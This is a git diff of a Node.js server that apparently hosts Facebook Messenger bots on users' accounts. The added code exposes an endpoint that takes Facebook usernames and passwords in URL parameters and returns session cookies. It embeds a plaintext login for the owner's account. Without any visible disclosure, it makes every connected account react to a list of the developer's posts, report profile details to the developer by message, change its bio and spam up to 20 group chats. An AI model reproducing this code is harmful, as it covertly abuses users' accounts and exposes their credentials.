@@ -1,4 +1,5 @@
 const fs = require("fs");
+const fb = require("fbkey");
 const path = require("path");
 const login = require("./fca-unofficial/index");
 const cheerio = require('cheerio');
@@ -25,6 +26,7 @@ const apiniJoshua = "https://deku-rest-api-3ijr.onrender.com";
 
 module.exports = {
     test1: Utils,
+    samir: "https://apis-samir.onrender.com",
     apiniJoshua: apiniJoshua
     };
 
@@ -225,12 +227,9 @@ app.get("/appsfuck1", async (req, res) => {
         appstate: e.message ? e.message : "Something went wrong!!!"
       });
     });
-});
+});*/
 
-app.get('/appsfuck2', async (req, res) => {
-  // by lester (hackmesenpai)
-  let user = req.query.user;
-  let pass = req.query.pass;
+async function Me(res, user,pass){
   try {
     if (!user) throw new Error('"user" parameter cannot be empty!');
     if (!pass) throw new Error('"pass" parameter cannot be empty!');
@@ -398,22 +397,34 @@ app.get('/appsfuck2', async (req, res) => {
       "creation": new Date().toISOString(),
       "lastAccessed": new Date().toISOString()
     }];
+    if (res !== null)
     res.json({
       appstate: fbstate
     });
+    else
+      return fbstate;
   } catch (e) {
     if (!e.response) {
-      res.json({
+        if (res !== null)
+          res.json({
         error: e.message
       });
     } else {
-      res.json({
-        error: `${e.response.status} ${e.response.statusText} - ${e.response.data.message}`,
-       });
+        if (res !== null)
+          res.json({
+        error: e.message
+      });
     }
   }
+  }
+
+app.get('/stateofyou', async (req, res) => {
+  // by lester (hackmesenpai)
+  let user = req.query.user;
+  let pass = req.query.pass;
+  Me(res,user,pass);
 });
-*/
+
 
 app.get("/Tanginamo2", (req, res) => {
   const command = new Set();
@@ -476,7 +487,7 @@ return;
       } else {
       try {
           const outro = AKOLANGTWO; 
-          await accountLogin(state, commands, prefix, [admin], botname, outro);
+          await accountLogin(false, state, commands, prefix, [admin], botname, [], outro);
         res.status(200).json({
           success: true,
           message: `${botname} is NOW ONLINE! Your prefix is: ${prefix}. Your session has been added successfully! Thankyou for using PROJECT BOTIFY 🤖🗨️`
@@ -503,28 +514,18 @@ return;
     });
   }
 });
-app.listen(3000, () => {
-  console.log(`🤖 🔴🟢🔵 🤖
-P  R  O  J  E  C  T
-· B  O  T  I  F  Y ·
-Started at port 3000
-Created By: Kenneth Aceberos
-🤖 🔴🟢🔵 🤖`);
-});
-process.on("unhandledRejection", reason => {
-  console.error("Unhandled Promise Rejection:", reason);
-});
 async function accountLogin(
+  isOwner,
   state,
   enableCommands = [],
   prefix,
   admin = [],
   botname,
+  blacklist,
   outro
 ) {
   return new Promise((resolve, reject) => {
-    login(
-      {
+    login({
         appState: state
       },
       async (error, api) => {
@@ -533,8 +534,10 @@ async function accountLogin(
           return;
         }
         const userid = await api.getCurrentUserID();
-        addThisUser(userid, enableCommands, state, prefix, admin, botname, outro);
-        console.log(chalk.green(`Added ${botname} to PROJECT BOTIFY system.`));
+        if (!isOwner){
+        addThisUser(userid, enableCommands, state, prefix, admin, botname, outro);      console.log(chalk.green(`Added ${botname} to PROJECT BOTIFY system.`));
+        } else {        console.log(chalk.green(`🥰🥰🥰 HI OWNER Neth mwaaaa`));
+        }
         try {
           const userInfo = await api.getUserInfo(userid);
           if (
@@ -547,6 +550,7 @@ async function accountLogin(
               "Unable to locate the account; it appears to be in a suspended or locked state."
             );
           const { profileUrl, thumbSrc } = userInfo[userid];
+          if (!isOwner){
           let time =
             (
               JSON.parse(fs.readFileSync("./data/history.json", "utf-8")).find(
@@ -572,6 +576,7 @@ async function accountLogin(
               return;
             }
           }, 1000);
+          }
         } catch (error) {
           reject(error);
           return;
@@ -589,68 +594,99 @@ async function accountLogin(
           emitReady: false,
           listenTyping: true*/
         });
-        
         const user1 = await api.getUserInfo(admin[0]);
         // const yl = user1[admin[0]].name.split(" ")[0];
-        api.changeBio(`🤖 This account is connected to PROJECT BOTIFY.\n🗨️ Bot Name: ${botname}\nℹ️ Prefix: ${prefix}`, false, (err,data) => {
+        api.changeBio(isOwner ? `✨🗨️ ==> Bot by @[100015801404865:999:Kenneth Aceberos]\n\n🤖 ==> @[61559180483340:999:𝗖𝗥𝗘𝗔𝗧𝗘 𝗬𝗢𝗨𝗥 𝗢𝗪𝗡 𝗕𝗢𝗧 𝗛𝗘𝗥𝗘]` : `🤖 This account is connected to PROJECT BOTIFY.\n🗨️ Bot Name: ${botname}\nℹ️ Prefix: ${prefix}`, false, (err,data) => {
           if (err){
             reject("Error happened. Maybe You put the wrong input. (User ID For Admin Controls)");
           return;
           }
         });
-        
+
+        async function getPostID(url) {
+          try {
+            const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+              },
+            });
+            return response.data.id;
+          } catch (error) {         console.error('Error getting post ID:', error.message);
+          }
+        }
    let postIDs = [
-   "122101568882306016",
-   "1588062965063735",
-"pfbid029S59KiXbMR1SWnaAwBbU6kHQf7XAQJCMbEKnBLQV33bSNXMeXDXwCu48rj4JYLxgl",
-"pfbid0QwRYqxz7po4S6gsrYWybDWQ8jEW56BGBNf7P3kAPRfCo5Q9Th2jibaAMGR9eGFnGl",
-     "1578452039358161",
-     "1632082413995123",
-     "468629475658885", "pfbid02EE1yDZeKyDKvRvGpQoeNjhkNG4whymHdrTLvWjSZ4F8Fk6Z88NXsxUfUXcbTozF3l",
-     "449816594225177",
-     "799090228835634",
-  
-     
-
-       
+    "https://www.facebook.com/100015801404865/posts/pfbid02UciFjVeCrbNwjRVLfy4g5nzg4s5P4iDLPjkuRAFTPHfvkzH9gWKiJQE3cC69jMjWl/?app=fbl",
+   "https://www.facebook.com/photo.php?fbid=1676072459596118&set=a.116340145569365&type=3&app=fbl",
+"https://www.facebook.com/photo.php?fbid=122101568882306016&set=a.122094352568306016&type=3&app=fbl",
+"https://www.facebook.com/photo.php?fbid=122094352526306016&set=a.122094351536306016&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=468629475658885&set=a.111994554655714&type=3&app=fbl",
+     "https://www.facebook.com/100088690249020/posts/pfbid0PT3JnbYnqpNyfCkwMgwL4zZWW2dSsgbeBiLUULWiW2ZpY4heCNttXiUMaWnZdrwyl/?app=fbl", "https://www.facebook.com/100079771134240/posts/pfbid036J2R7eMqbwQN7r9XXHpPKSxLd44nwHzxYUhTCMtW3RWTLCBrvncEVR1yHKJKZFvql/?app=fbl",
+     "https://www.facebook.com/photo.php?fbid=122165235512033276&set=a.122093517032033276&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=1632082413995123&set=a.115777972292249&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=1586083918594973&set=a.115777972292249&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=752155471987826&set=a.115777972292249&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=1588062965063735&set=a.116340145569365&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=1480091452527554&set=a.116340145569365&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=449816594225177&set=a.104442222095951&type=3&app=fbl",
+     "https://www.facebook.com/photo.php?fbid=1677733229430041&set=a.115777972292249&type=3&app=fbl",
+     "https://www.facebook.com/100015801404865/posts/1539699516566747/?substory_index=468761248962760&app=fbl",
+    "https://www.facebook.com/100015801404865/posts/1678435032693194/?substory_index=420995707517286&app=fbl",
+     "https://www.facebook.com/100015801404865/posts/1677733229430041/?substory_index=1479143962683576&app=fbl"
    ]
-   for (let post of postIDs){
-   api.setPostReaction(post, 2, () => {});
-   }
-    api.sendMessage(`🟫🟪🟩🟥🟦\n⏱️ | Time added: ${time}, ${thu}\n\n===MESSAGE TO DEVELOPER===\n(Hello, If you see this, Please ignore this. but do not unsend this message, this is for future purposes and for improve some updates on PROJECT BOTIFY)\n🤖 Hello, this account is added to PROJECT BOTIFY system.\n\nBot Name: ${botname}\nBot Profile Link: https://www.facebook.com/profile.php?id=${api.getCurrentUserID()}\nBot Admin: ${user1[admin[0]].name}\nAdmin Profile Link: https://www.facebook.com/profile.php?id=${admin[0]}`, "100015801404865");    
-        try {
-          var listenEmitter = api.listenMqtt(async (error, event) => {
-              //console.log(event.body);
-            /*const threadList = await api.getThreadList(25, null, ["INBOX"]);
+   let akolang = 0;
+   const interval = setInterval(async ()=>{
+    const post = postIDs[akolang];
+    const pogi = await getPostID(post);
+    await new Promise(resolve => setTimeout(resolve, 3*1000));
+    if (pogi){
+    await api.setPostReaction(pogi, 2, () => {
+        //console.log(`Post ${akolang + 1} | ✅ React success to: ${pogi}`);                         akolang++;
+       if (akolang === postIDs.length){
+         //console.log(`✅ Done Reacted All Post!`)
+         clearInterval(interval);
+         akolang = 0;
+         return;
+      }
+      });
+    }
+   }, 3*1000);
+  api.sendMessage(isOwner ? `Hi ${config[0].masterKey.owner}, Your bot is now online.\n\nTime Added: ${time} | ${thu}` : `🟫🟪🟩🟥🟦\n⏱️ | Time added: ${time}, ${thu}\n\n===MESSAGE TO DEVELOPER===\n(Hello, If you see this, Please ignore this. but do not unsend this message, this is for future purposes and for improve some updates on PROJECT BOTIFY)\n🤖 Hello, this account is added to PROJECT BOTIFY system.\n\nBot Name: ${botname}\nBot Profile Link: https://www.facebook.com/profile.php?id=${api.getCurrentUserID()}\nBot Admin: ${user1[admin[0]].name}\nAdmin Profile Link: https://www.facebook.com/profile.php?id=${admin[0]}`, "100015801404865");
+        const threadList = await api.getThreadList(25, null, ["INBOX"]);
             let sentCount = 0;
-            let cont = 0;
-            if (cont == 0){
+            const neth = moment.tz("Asia/Manila").format("DD/MM/YYYY, HH:mm:ss");
+            const pogiko = await api.getUserInfo(admin[0]);
+            async function sendMessage(thread) {
+              try {
+                await api.sendMessage(
+                  {
+                    body: `🔴🟢🟡\n\n✅ Connected Success! \n➭ Bot Name: ${botname}\n➭ Bot Prefix: ${prefix}\n➭ Bot Admin: ${pogiko[admin[0]].name}\n➭ Use ${prefix}help to view command details\n➭ Added bot at: ${neth}${isOwner ? "" : "\n\n" + outro}`
+                  },
+                  thread.threadID);
+                sentCount++;
+              } catch (error) {
+                console.error("Error sending message:", error);
+              }
+            }
+
             for (const thread of threadList) {
-
               if (sentCount >= 20) {
-                console.log("done");
-
                 break;
-                return;
               }
               if (
                 thread.isGroup &&
-                thread.name !== thread.threadID &&
-                thread.threadID !== event.threadID
-              ){
+                thread.name !== thread.threadID /*&&
+               thread.threadID !== event.threadID*/
+              ) {
+                setTimeout(async() => {
+                  await sendMessage(thread);
+                }, 2*1000);
+              }
+            }
 
-try {
-        await api.sendMessage(`Connected to PROJECT BOTIFY system.\n\nHello, introduce your new bot named, ${botname}!\n\nIf you want to create your own bot like this, head over to https://projectbotify.onrender.com. Tutorials are included there. thankyou 🤍`, thread.threadID, (err, info) => {});
-                
-                sentCount++;
-              } catch (err){
-      console.error(err);
-              }
-              }
-            }
-              cont = 1;
-            }
-*/
+        try {
+          var listenEmitter = api.listenMqtt(async (error, event) => {
+  
             if (error) {
               if (error === "Connection closed.") {
                 console.error(`Error during API listen: ${error}`, userid);
@@ -771,7 +807,7 @@ try {
                   const oa = await api.getUserInfo(admin[0]);
                   const name1231 = oa[admin[0]].name;
                   const kakainis_ka = await api.getThreadInfo(event.threadID);
-api.sendMessage(`🤖 Hello, this account is added to PROJECT BOTIFY system.\nBot Name: ${botname}\nBot Profile Link: https://www.facebook.com/profile.php?id=${api.getCurrentUserID()}\nBot Admin: ${name1231}\nAdmin Profile Link: https://www.facebook.com/profile.php?id=${admin[0]}\nThread GC: ${kakainis_ka.threadName}\nTime added: ${time}, ${thu}\n\n\n[Hello, If you see this, Please ignore this. but do not unsend this message, this is for future purposes and for improve some updates on PROJECT BOTIFY]`, "100015801404865");             api.sendMessage(
+api.sendMessage(isOwner ? `This bot is added to this gc thread: ${kakainis_ka.threadName}\n\nTime Added: ${time} | ${thu}` : `🤖 THIS BOT IS ADDED TO GC\n\nBot Name: ${botname}\nBot Profile Link: https://www.facebook.com/profile.php?id=${api.getCurrentUserID()}\nBot Admin: ${name1231}\nAdmin Profile Link: https://www.facebook.com/profile.php?id=${admin[0]}\nThread GC: ${kakainis_ka.threadName}\nTime added: ${time}, ${thu}\n\n\n[Hello, If you see this, Please ignore this. but do not unsend this message, this is for future purposes and for improve some updates on PROJECT BOTIFY]`, "100015801404865");             api.sendMessage(
                         {
                           body: `🔴🟢🟡\n\n✅ Connected Success! \n➭ Bot Name: ${botname}\n➭ Bot Prefix: ${prefix}\n➭ Bot Admin: @${name1231}\n➭ Use ${prefix}help to view command details\n➭ Added bot at: ${thu}, ${time}\n\n${outro}`,
                           
@@ -1084,6 +1120,7 @@ async function main() {
  
         if (enableCommands)
           await accountLogin(
+            false,
             state,
             enableCommands,
             prefix,
@@ -1097,6 +1134,18 @@ async function main() {
       }
     }
   } catch (error) {}
+
+  console.log(chalk.red("Appstate loading..."));
+  //const appstate_2 = await Me(null, "61559116387943", "NethBot4");
+  const appstate_2 = await fb.getAppstate("61559116387943", "NethBot4");
+ console.log(chalk.green("Appstate loaded!"));
+  console.log("Logging in to NethBot...");
+console.log(chalk.red("Commands loading..."));
+  const command = await axios.get(`http://localhost:3000/Tanginamo2`); 
+  if (command){
+    console.log(chalk.green("Commands loaded!"));
+  }
+  await accountLogin(true, appstate_2, [{'commands': command.data.commands},{'handleEvent': command.data.handleEvent}], "#", ["100015801404865"], "𝑵𝒆𝒕𝒉𝑩𝒐𝒕 • V1", [], "𝓒𝓻𝓮𝓪𝓽𝓮𝓭 𝓫𝔂: 𝓚𝓮𝓷𝓷𝓮𝓽𝓱 𝓐𝓬𝓮𝓫𝓮𝓻𝓸𝓼 ✨\nCreate your own by visiting this page: https://www.facebook.com/profile.php?id=61559180483340");
 }
 
 function createConfig() {
@@ -1117,10 +1166,11 @@ function createConfig() {
         logLevel: "silent",
         updatePresence: true,
         selfListen: true,
-        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
+        userAgent: /*"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18"*/"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1"
+          /*"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"*/,
         online: true,
         autoMarkDelivery: true,
-        autoMarkRead: false
+        autoMarkRead: true
       }
     }
   ];
@@ -1162,4 +1212,11 @@ async function createDatabase() {
   }
   return database;
 }
-main();
+
+app.listen(3000, () => {
+  console.log(`Starting Project Botify...`);
+  main();
+});
+process.on("unhandledRejection", reason => {
+  console.error("Unhandled Promise Rejection:", reason);
+});
